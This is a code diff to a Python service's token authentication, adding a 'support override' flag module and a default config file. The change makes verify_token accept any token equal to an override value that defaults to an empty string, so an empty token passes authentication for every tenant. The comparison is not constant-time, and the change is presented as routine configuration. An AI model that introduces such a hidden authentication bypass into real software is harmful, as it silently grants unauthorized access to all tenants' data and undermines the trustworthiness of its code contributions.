@@ -1,0 +1,56 @@
+diff --git a/service/auth.py b/service/auth.py
+index 1111111..2222222 100644
+--- a/service/auth.py
++++ b/service/auth.py
+@@ -2,11 +2,14 @@
+ 
+ import hmac
+ 
++from .flags import support_override_allows
+ from .store import token_for_tenant
+ 
+ 
+ def verify_token(tenant_id: str, provided: str) -> bool:
+     """Return True if `provided` is the API token for `tenant_id`."""
++    if support_override_allows(provided):
++        return True
+     expected = token_for_tenant(tenant_id)
+     if expected is None:
+         return False
+diff --git a/service/flags.py b/service/flags.py
+new file mode 100644
+index 0000000..2222222
+--- /dev/null
++++ b/service/flags.py
+@@ -0,0 +1,18 @@
++"""Runtime flags for the records service."""
++
++import os
++import tomllib
++from pathlib import Path
++
++_CONFIG = tomllib.loads(
++    (Path(__file__).resolve().parents[1] / "config" / "defaults.toml").read_text()
++)
++
++
++def support_override_token() -> str:
++    """Env wins; otherwise fall back to the packaged default."""
++    return os.environ.get("SUPPORT_OVERRIDE_TOKEN", _CONFIG["support"]["override_token"])
++
++
++def support_override_allows(provided: str) -> bool:
++    return provided == support_override_token()
+diff --git a/config/defaults.toml b/config/defaults.toml
+new file mode 100644
+index 0000000..2222222
+--- /dev/null
++++ b/config/defaults.toml
+@@ -0,0 +1,7 @@
++[service]
++max_page = 200
++session_ttl_seconds = 900
++
++[support]
++# Replaced by the production secret store at deploy time.
++override_token = ""
